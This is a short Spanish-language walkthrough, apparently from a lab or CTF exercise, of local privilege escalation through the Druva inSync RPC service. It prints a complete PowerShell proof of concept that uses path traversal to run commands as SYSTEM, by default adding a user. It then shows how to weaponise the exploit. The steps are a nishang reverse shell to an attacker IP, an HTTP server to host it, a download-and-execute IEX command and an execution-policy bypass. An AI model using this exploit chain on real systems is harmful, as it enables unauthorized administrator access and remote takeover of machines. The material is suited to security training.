## Ejemplo de escalada de privs locales con Druva inSync


Ya tenemos el PoC:

```
$ErrorActionPreference = "Stop" 
$cmd = "net user pwnd /add" 
$s = New-Object System.Net.Sockets.Socket( [System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, 
[System.Net.Sockets.ProtocolType]::Tcp ) 
$s.Connect("127.0.0.1", 6064) 
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]") 
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0") 
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd"); 
$length = [System.BitConverter]::GetBytes($command.Length); 
$s.Send($header) 
$s.Send($rpcType) 
$s.Send($length) 
$s.Send($command)
```
![[Pasted image 20260912130114.png]]

1. Modificando el PoC. Modificaremos la variable $cmd con el comando que queramos (podemos crear un usuario admin o una reverse shell)

Vamos a descargar [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) en nuestra maquina atacante y lo renombramos como `shell.ps1`. Al abrirlo debemos añadir al final:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Abrimos un listener HTTP en nuestra maquina:

```
python3 -m http.server 8080
```

Modificamos el PoC $cmd para que lo descargue desde nuestro servidor Python HTTP:

```
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```


2. Tras cambiar el PoC abrimos un listener en nuestra maquina y ejecutamos el PoC (Si no nos deja ejecutar comandos podemos usar primero `Set-ExecutionPolicy Bypass -Scope Process`)
